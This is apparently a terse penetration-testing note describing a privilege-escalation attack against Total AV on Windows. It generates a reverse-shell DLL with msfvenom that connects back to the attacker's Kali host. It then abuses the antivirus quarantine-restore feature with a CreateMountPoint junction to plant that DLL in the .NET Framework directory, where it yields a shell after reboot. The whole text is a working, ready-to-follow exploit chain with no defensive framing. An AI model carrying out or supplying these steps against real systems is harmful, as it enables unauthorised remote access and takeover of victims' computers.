
https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0

Download Release.7z

```bash - kali
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll > version.dll
```

Transfer version.dll and CreateMountPoint.exe to victim.

Make a folder in Windows, called mount.  

```command prompt - windows
cd /
```

```command prompt - windows
mkdir mount
```

Copy the version.dll file into it.

In Total AV, go to Antivirus > Quick Scan > Custom Scan > Add Folder > mount > Start Custom Scan.

Once version.dll is found, click "resolve", leave action as "Quarantine".

Click the "Remove Threat" button.

Go to Quarantine and confirm version.dll is there.

In PowerShell, navigate to Downloads folder.

```powershell - windows
.\CreateMountPoint.exe "C:\mount" "C:\Windows\Microsoft.NET\Framework\v4.0.30319\"
```

In Total AV, click the check box for version.dll and hit the Restore button.

![[rlwrap]]

Restart the Windows target to trigger the reverse shell.
